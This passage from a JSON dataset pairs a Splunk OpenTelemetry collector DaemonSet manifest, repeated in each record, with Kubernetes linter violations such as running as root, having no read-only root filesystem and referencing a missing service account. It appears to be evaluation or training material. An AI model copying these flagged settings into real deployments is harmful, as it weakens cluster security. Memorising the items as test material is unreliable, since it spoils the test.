       name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"otel-collector\" does not have a read-only root file system"
  },
  {
    "id": "2033",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prepare-fluentd-config\" does not have a read-only root file system"
  },
  {
    "id": "2034",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"default-splunk-otel-collector\" not found"
  },
  {
    "id": "2035",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"otel-collector\" does not expose port 13133 for the HTTPGet"
  },
  {
    "id": "2036",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fluentd\" is not set to runAsNonRoot"
  },
  {
    "id": "2037",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"otel-collector\" is not set to runAsNonRoot"
  },
  {
    "id": "2038",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
